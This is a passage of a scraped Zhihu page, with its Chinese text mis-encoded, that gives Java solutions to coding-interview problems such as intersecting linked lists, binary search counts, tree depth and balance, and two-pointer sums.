class=\"origin_image zh-lightbox-thumb\" width=\"902\" data-original=\"https://pic3.zhimg.com/v2-e9a1e3287939b45c46d3db9a7a0933c6_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;902&#39; height=&#39;229&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"902\" data-rawheight=\"229\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"902\" data-original=\"https://pic3.zhimg.com/v2-e9a1e3287939b45c46d3db9a7a0933c6_r.jpg\" data-actualsrc=\"https://pic3.zhimg.com/v2-e9a1e3287939b45c46d3db9a7a0933c6_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h2>è§£é¢˜æ€è·¯</h2><p>è®¾ A çš„é•¿åº¦ä¸º a + cï¼ŒB çš„é•¿åº¦ä¸º b + cï¼Œå…¶ä¸­ c ä¸ºå°¾éƒ¨å…¬å…±éƒ¨åˆ†é•¿åº¦ï¼Œå¯çŸ¥ a + c + b = b + c + aã€‚</p><p>å½“è®¿é—®é“¾è¡¨ A çš„æŒ‡é’ˆè®¿é—®åˆ°é“¾è¡¨å°¾éƒ¨æ—¶ï¼Œä»¤å®ƒä»é“¾è¡¨ B çš„å¤´éƒ¨é‡æ–°å¼€å§‹è®¿é—®é“¾è¡¨ Bï¼›åŒæ ·åœ°ï¼Œå½“è®¿é—®é“¾è¡¨ B çš„æŒ‡é’ˆè®¿é—®åˆ°é“¾è¡¨å°¾éƒ¨æ—¶ï¼Œä»¤å®ƒä»é“¾è¡¨ A çš„å¤´éƒ¨é‡æ–°å¼€å§‹è®¿é—®é“¾è¡¨ Aã€‚è¿™æ ·å°±èƒ½æ§åˆ¶è®¿é—® A å’Œ B ä¸¤ä¸ªé“¾è¡¨çš„æŒ‡é’ˆèƒ½åŒæ—¶è®¿é—®åˆ°äº¤ç‚¹ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"n\">ListNode</span> <span class=\"nf\">FindFirstCommonNode</span><span class=\"o\">(</span><span class=\"n\">ListNode</span> <span class=\"n\">pHead1</span><span class=\"o\">,</span> <span class=\"n\">ListNode</span> <span class=\"n\">pHead2</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"n\">ListNode</span> <span class=\"n\">l1</span> <span class=\"o\">=</span> <span class=\"n\">pHead1</span><span class=\"o\">,</span> <span class=\"n\">l2</span> <span class=\"o\">=</span> <span class=\"n\">pHead2</span><span class=\"o\">;</span>\n    <span class=\"k\">while</span> <span class=\"o\">(</span><span class=\"n\">l1</span> <span class=\"o\">!=</span> <span class=\"n\">l2</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"n\">l1</span> <span class=\"o\">=</span> <span class=\"o\">(</span><span class=\"n\">l1</span> <span class=\"o\">==</span> <span class=\"kc\">null</span><span class=\"o\">)</span> <span class=\"o\">?</span> <span class=\"n\">pHead2</span> <span class=\"o\">:</span> <span class=\"n\">l1</span><span class=\"o\">.</span><span class=\"na\">next</span><span class=\"o\">;</span>\n        <span class=\"n\">l2</span> <span class=\"o\">=</span> <span class=\"o\">(</span><span class=\"n\">l2</span> <span class=\"o\">==</span> <span class=\"kc\">null</span><span class=\"o\">)</span> <span class=\"o\">?</span> <span class=\"n\">pHead1</span> <span class=\"o\">:</span> <span class=\"n\">l2</span><span class=\"o\">.</span><span class=\"na\">next</span><span class=\"o\">;</span>\n    <span class=\"o\">}</span>\n    <span class=\"k\">return</span> <span class=\"n\">l1</span><span class=\"o\">;</span>\n<span class=\"o\">}</span></code></pre></div><h2>53. æ•°å­—åœ¨æ’åºæ•°ç»„ä¸­å‡ºç°çš„æ¬¡æ•°</h2><p><a href=\"https://link.zhihu.com/?target=https%3A//www.nowcoder.com/practice/70610bf967994b22bb1c26f9ae901fa2%3FtpId%3D13%26tqId%3D11190%26tPage%3D1%26rp%3D1%26ru%3D/ta/coding-interviews%26qru%3D/ta/coding-interviews/question-ranking\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">NowCoder</a></p><h2>é¢˜ç›®æè¿°</h2><div class=\"highlight\"><pre><code class=\"language-html\">Input:\nnums = 1, 2, 3, 3, 3, 3, 4, 6\nK = 3\n\nOutput:\n4</code></pre></div><h2>è§£é¢˜æ€è·¯</h2><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kt\">int</span> <span class=\"nf\">GetNumberOfK</span><span class=\"o\">(</span><span class=\"kt\">int</span><span class=\"o\">[]</span> <span class=\"n\">nums</span><span class=\"o\">,</span> <span class=\"kt\">int</span> <span class=\"n\">K</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"kt\">int</span> <span class=\"n\">first</span> <span class=\"o\">=</span> <span class=\"n\">binarySearch</span><span class=\"o\">(</span><span class=\"n\">nums</span><span class=\"o\">,</span> <span class=\"n\">K</span><span class=\"o\">);</span>\n    <span class=\"kt\">int</span> <span class=\"n\">last</span> <span class=\"o\">=</span> <span class=\"n\">binarySearch</span><span class=\"o\">(</span><span class=\"n\">nums</span><span class=\"o\">,</span> <span class=\"n\">K</span> <span class=\"o\">+</span> <span class=\"n\">1</span><span class=\"o\">);</span>\n    <span class=\"k\">return</span> <span class=\"o\">(</span><span class=\"n\">first</span> <span class=\"o\">==</span> <span class=\"n\">nums</span><span class=\"o\">.</span><span class=\"na\">length</span> <span class=\"o\">||</span> <span class=\"n\">nums</span><span class=\"o\">[</span><span class=\"n\">first</span><span class=\"o\">]</span> <span class=\"o\">!=</span> <span class=\"n\">K</span><span class=\"o\">)</span> <span class=\"o\">?</span> <span class=\"n\">0</span> <span class=\"o\">:</span> <span class=\"n\">last</span> <span class=\"o\">-</span> <span class=\"n\">first</span><span class=\"o\">;</span>\n<span class=\"o\">}</span>\n\n<span class=\"kd\">private</span> <span class=\"kt\">int</span> <span class=\"nf\">binarySearch</span><span class=\"o\">(</span><span class=\"kt\">int</span><span class=\"o\">[]</span> <span class=\"n\">nums</span><span class=\"o\">,</span> <span class=\"kt\">int</span> <span class=\"n\">K</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"kt\">int</span> <span class=\"n\">l</span> <span class=\"o\">=</span> <span class=\"n\">0</span><span class=\"o\">,</span> <span class=\"n\">h</span> <span class=\"o\">=</span> <span class=\"n\">nums</span><span class=\"o\">.</span><span class=\"na\">length</span><span class=\"o\">;</span>\n    <span class=\"k\">while</span> <span class=\"o\">(</span><span class=\"n\">l</span> <span class=\"o\">&lt;</span> <span class=\"n\">h</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"kt\">int</span> <span class=\"n\">m</span> <span class=\"o\">=</span> <span class=\"n\">l</span> <span class=\"o\">+</span> <span class=\"o\">(</span><span class=\"n\">h</span> <span class=\"o\">-</span> <span class=\"n\">l</span><span class=\"o\">)</span> <span class=\"o\">/</span> <span class=\"n\">2</span><span class=\"o\">;</span>\n        <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">nums</span><span class=\"o\">[</span><span class=\"n\">m</span><span class=\"o\">]</span> <span class=\"o\">&gt;=</span> <span class=\"n\">K</span><span class=\"o\">)</span>\n            <span class=\"n\">h</span> <span class=\"o\">=</span> <span class=\"n\">m</span><span class=\"o\">;</span>\n        <span class=\"k\">else</span>\n            <span class=\"n\">l</span> <span class=\"o\">=</span> <span class=\"n\">m</span> <span class=\"o\">+</span> <span class=\"n\">1</span><span class=\"o\">;</span>\n    <span class=\"o\">}</span>\n    <span class=\"k\">return</span> <span class=\"n\">l</span><span class=\"o\">;</span>\n<span class=\"o\">}</span></code></pre></div><h2>54. äºŒå‰æŸ¥æ‰¾æ ‘çš„ç¬¬ K ä¸ªç»“ç‚¹</h2><p><a href=\"https://link.zhihu.com/?target=https%3A//www.nowcoder.com/practice/ef068f602dde4d28aab2b210e859150a%3FtpId%3D13%26tqId%3D11215%26tPage%3D1%26rp%3D1%26ru%3D/ta/coding-interviews%26qru%3D/ta/coding-interviews/question-ranking\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">NowCoder</a></p><h2>è§£é¢˜æ€è·¯</h2><p>åˆ©ç”¨äºŒå‰æŸ¥æ‰¾æ ‘ä¸­åºéå†æœ‰åºçš„ç‰¹ç‚¹ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">private</span> <span class=\"n\">TreeNode</span> <span class=\"n\">ret</span><span class=\"o\">;</span>\n<span class=\"kd\">private</span> <span class=\"kt\">int</span> <span class=\"n\">cnt</span> <span class=\"o\">=</span> <span class=\"n\">0</span><span class=\"o\">;</span>\n\n<span class=\"kd\">public</span> <span class=\"n\">TreeNode</span> <span class=\"nf\">KthNode</span><span class=\"o\">(</span><span class=\"n\">TreeNode</span> <span class=\"n\">pRoot</span><span class=\"o\">,</span> <span class=\"kt\">int</span> <span class=\"n\">k</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"n\">inOrder</span><span class=\"o\">(</span><span class=\"n\">pRoot</span><span class=\"o\">,</span> <span class=\"n\">k</span><span class=\"o\">);</span>\n    <span class=\"k\">return</span> <span class=\"n\">ret</span><span class=\"o\">;</span>\n<span class=\"o\">}</span>\n\n<span class=\"kd\">private</span> <span class=\"kt\">void</span> <span class=\"nf\">inOrder</span><span class=\"o\">(</span><span class=\"n\">TreeNode</span> <span class=\"n\">root</span><span class=\"o\">,</span> <span class=\"kt\">int</span> <span class=\"n\">k</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">root</span> <span class=\"o\">==</span> <span class=\"kc\">null</span> <span class=\"o\">||</span> <span class=\"n\">cnt</span> <span class=\"o\">&gt;=</span> <span class=\"n\">k</span><span class=\"o\">)</span>\n        <span class=\"k\">return</span><span class=\"o\">;</span>\n    <span class=\"n\">inOrder</span><span class=\"o\">(</span><span class=\"n\">root</span><span class=\"o\">.</span><span class=\"na\">left</span><span class=\"o\">,</span> <span class=\"n\">k</span><span class=\"o\">);</span>\n    <span class=\"n\">cnt</span><span class=\"o\">++;</span>\n    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">cnt</span> <span class=\"o\">==</span> <span class=\"n\">k</span><span class=\"o\">)</span>\n        <span class=\"n\">ret</span> <span class=\"o\">=</span> <span class=\"n\">root</span><span class=\"o\">;</span>\n    <span class=\"n\">inOrder</span><span class=\"o\">(</span><span class=\"n\">root</span><span class=\"o\">.</span><span class=\"na\">right</span><span class=\"o\">,</span> <span class=\"n\">k</span><span class=\"o\">);</span>\n<span class=\"o\">}</span></code></pre></div><h2>55.1 äºŒå‰æ ‘çš„æ·±åº¦</h2><p><a href=\"https://link.zhihu.com/?target=https%3A//www.nowcoder.com/practice/435fb86331474282a3499955f0a41e8b%3FtpId%3D13%26tqId%3D11191%26tPage%3D1%26rp%3D1%26ru%3D/ta/coding-interviews%26qru%3D/ta/coding-interviews/question-ranking\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">NowCoder</a></p><h2>é¢˜ç›®æè¿°</h2><p>ä»æ ¹ç»“ç‚¹åˆ°å¶ç»“ç‚¹ä¾æ¬¡ç»è¿‡çš„ç»“ç‚¹ï¼ˆå«æ ¹ã€å¶ç»“ç‚¹ï¼‰å½¢æˆæ ‘çš„ä¸€æ¡è·¯å¾„ï¼Œæœ€é•¿è·¯å¾„çš„é•¿åº¦ä¸ºæ ‘çš„æ·±åº¦ã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic3.zhimg.com/v2-6281f25c576cdbe08c5dca6770ab02e2_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"589\" data-rawheight=\"375\" class=\"origin_image zh-lightbox-thumb\" width=\"589\" data-original=\"https://pic3.zhimg.com/v2-6281f25c576cdbe08c5dca6770ab02e2_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;589&#39; height=&#39;375&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"589\" data-rawheight=\"375\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"589\" data-original=\"https://pic3.zhimg.com/v2-6281f25c576cdbe08c5dca6770ab02e2_r.jpg\" data-actualsrc=\"https://pic3.zhimg.com/v2-6281f25c576cdbe08c5dca6770ab02e2_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h2>è§£é¢˜æ€è·¯</h2><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kt\">int</span> <span class=\"nf\">TreeDepth</span><span class=\"o\">(</span><span class=\"n\">TreeNode</span> <span class=\"n\">root</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"k\">return</span> <span class=\"n\">root</span> <span class=\"o\">==</span> <span class=\"kc\">null</span> <span class=\"o\">?</span> <span class=\"n\">0</span> <span class=\"o\">:</span> <span class=\"n\">1</span> <span class=\"o\">+</span> <span class=\"n\">Math</span><span class=\"o\">.</span><span class=\"na\">max</span><span class=\"o\">(</span><span class=\"n\">TreeDepth</span><span class=\"o\">(</span><span class=\"n\">root</span><span class=\"o\">.</span><span class=\"na\">left</span><span class=\"o\">),</span> <span class=\"n\">TreeDepth</span><span class=\"o\">(</span><span class=\"n\">root</span><span class=\"o\">.</span><span class=\"na\">right</span><span class=\"o\">));</span>\n<span class=\"o\">}</span></code></pre></div><h2>55.2 å¹³è¡¡äºŒå‰æ ‘</h2><p><a href=\"https://link.zhihu.com/?target=https%3A//www.nowcoder.com/practice/8b3b95850edb4115918ecebdf1b4d222%3FtpId%3D13%26tqId%3D11192%26tPage%3D1%26rp%3D1%26ru%3D/ta/coding-interviews%26qru%3D/ta/coding-interviews/question-ranking\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">NowCoder</a></p><h2>é¢˜ç›®æè¿°</h2><p>å¹³è¡¡äºŒå‰æ ‘å·¦å³å­æ ‘é«˜åº¦å·®ä¸è¶…è¿‡ 1ã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic4.zhimg.com/v2-aa36f34b9ae8c619aecd0c8b2bd02ca3_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"409\" data-rawheight=\"413\" class=\"content_image\" width=\"409\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;409&#39; height=&#39;413&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"409\" data-rawheight=\"413\" class=\"content_image lazy\" width=\"409\" data-actualsrc=\"https://pic4.zhimg.com/v2-aa36f34b9ae8c619aecd0c8b2bd02ca3_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h2>è§£é¢˜æ€è·¯</h2><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">private</span> <span class=\"kt\">boolean</span> <span class=\"n\">isBalanced</span> <span class=\"o\">=</span> <span class=\"kc\">true</span><span class=\"o\">;</span>\n\n<span class=\"kd\">public</span> <span class=\"kt\">boolean</span> <span class=\"nf\">IsBalanced_Solution</span><span class=\"o\">(</span><span class=\"n\">TreeNode</span> <span class=\"n\">root</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"n\">height</span><span class=\"o\">(</span><span class=\"n\">root</span><span class=\"o\">);</span>\n    <span class=\"k\">return</span> <span class=\"n\">isBalanced</span><span class=\"o\">;</span>\n<span class=\"o\">}</span>\n\n<span class=\"kd\">private</span> <span class=\"kt\">int</span> <span class=\"nf\">height</span><span class=\"o\">(</span><span class=\"n\">TreeNode</span> <span class=\"n\">root</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">root</span> <span class=\"o\">==</span> <span class=\"kc\">null</span> <span class=\"o\">||</span> <span class=\"o\">!</span><span class=\"n\">isBalanced</span><span class=\"o\">)</span>\n        <span class=\"k\">return</span> <span class=\"n\">0</span><span class=\"o\">;</span>\n    <span class=\"kt\">int</span> <span class=\"n\">left</span> <span class=\"o\">=</span> <span class=\"n\">height</span><span class=\"o\">(</span><span class=\"n\">root</span><span class=\"o\">.</span><span class=\"na\">left</span><span class=\"o\">);</span>\n    <span class=\"kt\">int</span> <span class=\"n\">right</span> <span class=\"o\">=</span> <span class=\"n\">height</span><span class=\"o\">(</span><span class=\"n\">root</span><span class=\"o\">.</span><span class=\"na\">right</span><span class=\"o\">);</span>\n    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">Math</span><span class=\"o\">.</span><span class=\"na\">abs</span><span class=\"o\">(</span><span class=\"n\">left</span> <span class=\"o\">-</span> <span class=\"n\">right</span><span class=\"o\">)</span> <span class=\"o\">&gt;</span> <span class=\"n\">1</span><span class=\"o\">)</span>\n        <span class=\"n\">isBalanced</span> <span class=\"o\">=</span> <span class=\"kc\">false</span><span class=\"o\">;</span>\n    <span class=\"k\">return</span> <span class=\"n\">1</span> <span class=\"o\">+</span> <span class=\"n\">Math</span><span class=\"o\">.</span><span class=\"na\">max</span><span class=\"o\">(</span><span class=\"n\">left</span><span class=\"o\">,</span> <span class=\"n\">right</span><span class=\"o\">);</span>\n<span class=\"o\">}</span></code></pre></div><h2>56. æ•°ç»„ä¸­åªå‡ºç°ä¸€æ¬¡çš„æ•°å­—</h2><p><a href=\"https://link.zhihu.com/?target=https%3A//www.nowcoder.com/practice/e02fdb54d7524710a7d664d082bb7811%3FtpId%3D13%26tqId%3D11193%26tPage%3D1%26rp%3D1%26ru%3D/ta/coding-interviews%26qru%3D/ta/coding-interviews/question-ranking\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">NowCoder</a></p><h2>é¢˜ç›®æè¿°</h2><p>ä¸€ä¸ªæ•´å‹æ•°ç»„é‡Œé™¤äº†ä¸¤ä¸ªæ•°å­—ä¹‹å¤–ï¼Œå…¶ä»–çš„æ•°å­—éƒ½å‡ºç°äº†ä¸¤æ¬¡ï¼Œæ‰¾å‡ºè¿™ä¸¤ä¸ªæ•°ã€‚</p><h2>è§£é¢˜æ€è·¯</h2><p>ä¸¤ä¸ªä¸ç›¸ç­‰çš„å…ƒç´ åœ¨ä½çº§è¡¨ç¤ºä¸Šå¿…å®šä¼šæœ‰ä¸€ä½å­˜åœ¨ä¸åŒï¼Œå°†æ•°ç»„çš„æ‰€æœ‰å…ƒç´ å¼‚æˆ–å¾—åˆ°çš„ç»“æœä¸ºä¸å­˜åœ¨é‡å¤çš„ä¸¤ä¸ªå…ƒç´ å¼‚æˆ–çš„ç»“æœã€‚</p><p>diff &amp;= -diff å¾—åˆ°å‡º diff æœ€å³ä¾§ä¸ä¸º 0 çš„ä½ï¼Œä¹Ÿå°±æ˜¯ä¸å­˜åœ¨é‡å¤çš„ä¸¤ä¸ªå…ƒç´ åœ¨ä½çº§è¡¨ç¤ºä¸Šæœ€å³ä¾§ä¸åŒçš„é‚£ä¸€ä½ï¼Œåˆ©ç”¨è¿™ä¸€ä½å°±å¯ä»¥å°†ä¸¤ä¸ªå…ƒç´ åŒºåˆ†å¼€æ¥ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kt\">void</span> <span class=\"nf\">FindNumsAppearOnce</span><span class=\"o\">(</span><span class=\"kt\">int</span><span class=\"o\">[]</span> <span class=\"n\">nums</span><span class=\"o\">,</span> <span class=\"kt\">int</span> <span class=\"n\">num1</span><span class=\"o\">[],</span> <span class=\"kt\">int</span> <span class=\"n\">num2</span><span class=\"o\">[])</span> <span class=\"o\">{</span>\n    <span class=\"kt\">int</span> <span class=\"n\">diff</span> <span class=\"o\">=</span> <span class=\"n\">0</span><span class=\"o\">;</span>\n    <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">num</span> <span class=\"o\">:</span> <span class=\"n\">nums</span><span class=\"o\">)</span>\n        <span class=\"n\">diff</span> <span class=\"o\">^=</span> <span class=\"n\">num</span><span class=\"o\">;</span>\n    <span class=\"n\">diff</span> <span class=\"o\">&amp;=</span> <span class=\"o\">-</span><span class=\"n\">diff</span><span class=\"o\">;</span>\n    <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">num</span> <span class=\"o\">:</span> <span class=\"n\">nums</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"k\">if</span> <span class=\"o\">((</span><span class=\"n\">num</span> <span class=\"o\">&amp;</span> <span class=\"n\">diff</span><span class=\"o\">)</span> <span class=\"o\">==</span> <span class=\"n\">0</span><span class=\"o\">)</span>\n            <span class=\"n\">num1</span><span class=\"o\">[</span><span class=\"n\">0</span><span class=\"o\">]</span> <span class=\"o\">^=</span> <span class=\"n\">num</span><span class=\"o\">;</span>\n        <span class=\"k\">else</span>\n            <span class=\"n\">num2</span><span class=\"o\">[</span><span class=\"n\">0</span><span class=\"o\">]</span> <span class=\"o\">^=</span> <span class=\"n\">num</span><span class=\"o\">;</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span></code></pre></div><h2>57.1 å’Œä¸º S çš„ä¸¤ä¸ªæ•°å­—</h2><p><a href=\"https://link.zhihu.com/?target=https%3A//www.nowcoder.com/practice/390da4f7a00f44bea7c2f3d19491311b%3FtpId%3D13%26tqId%3D11195%26tPage%3D1%26rp%3D1%26ru%3D/ta/coding-interviews%26qru%3D/ta/coding-interviews/question-ranking\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">NowCoder</a></p><h2>é¢˜ç›®æè¿°</h2><p>è¾“å…¥ä¸€ä¸ªé€’å¢æ’åºçš„æ•°ç»„å’Œä¸€ä¸ªæ•°å­— Sï¼Œåœ¨æ•°ç»„ä¸­æŸ¥æ‰¾ä¸¤ä¸ªæ•°ï¼Œä½¿å¾—ä»–ä»¬çš„å’Œæ­£å¥½æ˜¯ Sã€‚å¦‚æœæœ‰å¤šå¯¹æ•°å­—çš„å’Œç­‰äº Sï¼Œè¾“å‡ºä¸¤ä¸ªæ•°çš„ä¹˜ç§¯æœ€å°çš„ã€‚</p><h2>è§£é¢˜æ€è·¯</h2><p>ä½¿ç”¨åŒæŒ‡é’ˆï¼Œä¸€ä¸ªæŒ‡é’ˆæŒ‡å‘å…ƒç´ è¾ƒå°çš„å€¼ï¼Œä¸€ä¸ªæŒ‡é’ˆæŒ‡å‘å…ƒç´ è¾ƒå¤§çš„å€¼ã€‚æŒ‡å‘è¾ƒå°å…ƒç´ çš„æŒ‡é’ˆä»å¤´å‘å°¾éå†ï¼ŒæŒ‡å‘è¾ƒå¤§å…ƒç´ çš„æŒ‡é’ˆä»å°¾å‘å¤´éå†ã€‚</p><ul><li>å¦‚æœä¸¤ä¸ªæŒ‡é’ˆæŒ‡å‘å…ƒç´ çš„å’Œ sum == targetï¼Œé‚£ä¹ˆå¾—åˆ°è¦æ±‚çš„ç»“æœï¼›</li><li>å¦‚æœ sum &gt; targetï¼Œç§»åŠ¨è¾ƒå¤§çš„å…ƒç´ ï¼Œä½¿ sum å˜å°ä¸€äº›ï¼›</li><li>å¦‚æœ sum &lt; targetï¼Œç§»åŠ¨è¾ƒå°çš„å…ƒç´ ï¼Œä½¿ sum å˜å¤§ä¸€äº›ã€‚</li></ul><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"n\">ArrayList</span><span class=\"o\">&lt;</span><span class=\"n\">Integer</span><span class=\"o\">&gt;</span> <span class=\"nf\">FindNumbersWithSum</span><span class=\"o\">(</span><span class=\"kt\">int</span><span class=\"o\">[]</span> <span class=\"n\">array</span><span class=\"o\">,</span> <span class=\"kt\">int</span> <span class=\"n\">sum</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"kt\">int</span> <span class=\"n\">i</span> <span class=\"o\">=</span> <span class=\"n\">0</span><span class=\"o\">,</span> <span class=\"n\">j</span> <span class=\"o\">=</span> <span class=\"n\">array</span><span class=\"o\">.</span><span class=\"na\">length</span> <span class=\"o\">-</span> <span class=\"n\">1</span><span class=\"o\">;</span>\n    <span class=\"k\">while</span> <span class=\"o\">(</span><span class=\"n\">i</span> <span class=\"o\">&lt;</span> <span class=\"n\">j</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"kt\">int</span> <span class=\"n\">cur</span> <span class=\"o\">=</span> <span class=\"n\">array</span><span class=\"o\">[</span><span class=\"n\">i</span><span class=\"o\">]</span> <span class=\"o\">+</span> <span class=\"n\">array</span><span class=\"o\">[</span><span class=\"n\">j</span><span class=\"o\">];</span>\n        <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">cur</span> <span class=\"o\">==</span> <span class=\"n\">sum</span><span class=\"o\">)</span>\n            <span class=\"k\">return</span> <span class=\"k\">new</span> <span class=\"n\">ArrayList</span><span class=\"o\">&lt;&gt;(</span><span class=\"n\">Arrays</span><span class=\"o\">.</span><span class=\"na\">asList</span><span class=\"o\">(</span><span class=\"n\">array</span><span class=\"o\">[</span><span class=\"n\">i</span><span class=\"o\">],</span> <span class=\"n\">array</span><span class=\"o\">[</span><span class=\"n\">j</span><span class=\"o\">]));</span>\n        <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">cur</span> <span class=\"o\">&lt;</span> <span class=\"n\">sum</span><span class=\"o\">)</span>\n            <span class=\"n\">i</span><span class=\"o\">++;</span>\n        <span class=\"k\">else</span>\n            <span class=\"n\">j</span><span class=\"o\">--;</span>\n    <span class=\"o\">}</span>\n    <span class=\"k\">return</span> <span class=\"k\">new</span> <span class=\"n\">ArrayList</span><span class=\"o\">&lt;&gt;();</span>\n<span class=\"o\">}</span></code></pre></div><h2>57.2 å’Œä¸º S çš„è¿ç»­æ­£æ•°åºåˆ—</h2><p><a href=\"https://link.zhihu.com/?target=https%3A//www.nowcoder.com/practice/c451a3fd84b64cb19485dad758a55ebe%3FtpId%3D13%26tqId%3D11194%26tPage%3D1%26rp%3D1%26ru%3D/ta/coding-interviews%26qru%3D/ta/coding-interviews/question-ranking\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">NowCoder</a></p><h2>é¢˜ç›®æè¿°</h2><p>è¾“å‡ºæ‰€æœ‰å’Œä¸º S çš„è¿ç»­æ­£æ•°åºåˆ—ã€‚</p><p>ä¾‹å¦‚å’Œä¸º 100 çš„è¿ç»­åºåˆ—æœ‰ï¼š</p><div class=\"highlight\"><pre><code class=\"language-text\">[9, 10, 11, 12, 13, 14, 15, 16]\n[18, 19, 20, 21, 22]ã€‚</code></pre></div><h2>è§£é¢˜æ€è·¯</h2><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"n\">ArrayList</span><span class=\"o\">&lt;</span><span class=\"n\">ArrayList</span><span class=\"o\">&lt;</span><span class=\"n\">Integer</span><span class=\"o\">&gt;&gt;</span> <span class=\"nf\">FindContinuousSequence</span><span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">sum</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"n\">ArrayList</span><span class=\"o\">&lt;</span><span class=\"n\">ArrayList</span><span class=\"o\">&lt;</span><span class=\"n\">Integer</span><span class=\"o\">&gt;&gt;</span> <span class=\"n\">ret</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">ArrayList</span><span class=\"o\">&lt;&gt;();</span>\n    <span class=\"kt\">int</span> <span class=\"n\">start</span> <span class=\"o\">=</span> <span class=\"n\">1</span><span class=\"o\">,</span> <span class=\"n\">end</span> <span class=\"o\">=</span> <span class=\"n\">2</span><span class=\"o\">;</span>\n    <span class=\"kt\">int</span> <span class=\"n\">curSum</span> <span class=\"o\">=</span> <span class=\"n\">3</span><span class=\"o\">;</span>\n    <span class=\"k\">while</span> <span class=\"o\">(</span><span class=\"n\">end</span> <span class=\"o\">&lt;</span> <span class=\"n\">sum</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">curSum</span> <span class=\"o\">&gt;</span> <span class=\"n\">sum</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n            <span class=\"n\">curSum</span> <span class=\"o\">-=</span> <span class=\"n\">start</span><span class=\"o\">;</span>\n            <span class=\"n\">start</span><span class=\"o\">++;</span>\n        <span class=\"o\">}</span> <span class=\"k\">else</span> <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">curSum</span> <span class=\"o\">&lt;</span> <span class=\"n\">sum</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n            <span class=\"n\">end</span><span class=\"o\">++;</span>\n            <span class=\"n\">curSum</span> <span class=\"o\">+=</span> <span class=\"n\">end</span><span class=\"o\">;</span>\n        <span class=\"o\">}</span> <span class=\"k\">else</span> <span class=\"o\">{</span>\n            <span class=\"n\">ArrayList</span><span class=\"o\">&lt;</span><span class=\"n\">Integer</span><span class=\"o\">&gt;</span> <span class=\"n\">list</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">ArrayList</span><span class=\"o\">&lt;&gt;();</span>\n            <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">i</span> <span class=\"o\">=</span> <span class=\"n\">start</span><span class=\"o\">;</span> <span class=\"n\">i</span> <span class=\"o\">&lt;=</span> <span class=\"n\">end</span><span class=\"o\">;</span> <span class=\"n\">i</span><span class=\"o\">++)</span>\n                <span 